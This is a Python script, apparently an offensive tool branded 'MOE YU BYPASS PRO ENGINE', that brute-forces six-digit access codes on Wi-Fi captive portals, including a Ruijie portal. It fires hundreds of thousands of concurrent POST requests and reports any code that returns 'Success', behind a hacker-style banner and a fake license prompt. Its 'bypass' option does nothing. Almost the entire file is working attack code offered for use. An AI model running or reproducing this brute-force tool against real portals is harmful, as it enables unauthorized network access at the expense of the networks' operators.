import asyncio, aiohttp, requests, time, os, uuid, sys, urllib3
from rich.console import Console
from rich.panel import Panel
from rich.align import Align
from tqdm import tqdm

# SETUP
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

# CONFIG
PORTALS = {
    "1": {"name": "Ruijie Old Portal", "url": "http://192.168.60.1/auth", "payload": "code"},
    "2": {"name": "Modern Captive Portal", "url": "http://target-portal.com/login", "payload": "password"}
}

BABY_LOGO = "\n[bold cyan]      _ \n    _(_)_ \n   (_)@(_) \n     (_)\  / \n      /  || \n  ___/___||___\n |____________|[/bold cyan]"
BANNER = "[bold #00FF00]\n ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦\n ║║║║ ║║╣   ╚╦╝║ ║\n ╩ ╩╚═╝╚═╝   ╩ ╚═╝\n      [#00FF00]M O E   Y U   H A C K E R[/#00FF00][/bold #00FF00]"

def display_hacker_flag():
    console.clear()
    console.print(Align.center(BABY_LOGO))
    console.print(Align.center(BANNER))
    console.print(Align.center("[bold cyan]MOE YU BYPASS PRO ENGINE v7.0 (ULTRA SPEED)[/bold cyan]\n"))

def get_hwid():
    id_file = os.path.expanduser("~/.moe_yu_id")
    if os.path.exists(id_file):
        with open(id_file, "r") as f: return f.read().strip()
    new_id = f"MOE-{str(uuid.uuid4()).split('-')[0].upper()}"
    with open(id_file, "w") as f: f.write(new_id)
    return new_id

# SCANNER LOGIC (HIGH SPEED)
async def bounded_scan(sem, session, code, target_cfg):
    async with sem:
        try:
            async with session.post(target_cfg['url'], data={target_cfg['payload']: code}, timeout=2) as resp:
                text = await resp.text()
                if resp.status == 200 and "Success" in text:
                    console.print(f"\n[bold green][!] FOUND HIT: {code}[/bold green]")
                    return True
        except: pass
    return False

async def run_scanner(target_cfg):
    console.print(f"[yellow][*] Starting Ultra Speed Scan: {target_cfg['name']}[/yellow]")
    connector = aiohttp.TCPConnector(limit=100)
    sem = asyncio.Semaphore(100)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        # tqdm progress bar
        for i in tqdm(range(100000, 999999), desc="Scanning Codes"):
            task = asyncio.create_task(bounded_scan(sem, session, str(i), target_cfg))
            tasks.append(task)
        await asyncio.gather(*tasks)

# MAIN
if __name__ == "__main__":
    display_hacker_flag()
    hwid = get_hwid()
    console.print(Panel(f"[bold white]HWID: {hwid}[/bold white]", title="[bold cyan]SECURITY[/bold cyan]"))
    user_key = input("\n [?] Enter Key: ")
    
    # License Check Logic (Placeholder)
    if user_key:
        while True:
            display_hacker_flag()
            console.print(Panel("[bold white]1. Start Bypass\n2. Start Scanner\n3. Exit[/bold white]", title="[bold cyan]MENU[/bold cyan]"))
            choice = input(" [?] Option: ")
            
            if choice == "1":
                console.print("[yellow][*] Bypass Engine Initialized...[/yellow]")
                time.sleep(1)
            elif choice == "2":
                console.print("Choose Target:\n1. Old Portal\n2. New Portal")
                target_choice = input(" >> ")
                target = PORTALS.get(target_choice)
                if target:
                    try:
                        asyncio.run(run_scanner(target))
                    except KeyboardInterrupt:
                        console.print("\n[red]Scanner Stopped![/red]")
                else:
                    console.print("[red]Invalid Target![/red]")
            elif choice == "3":
                sys.exit()
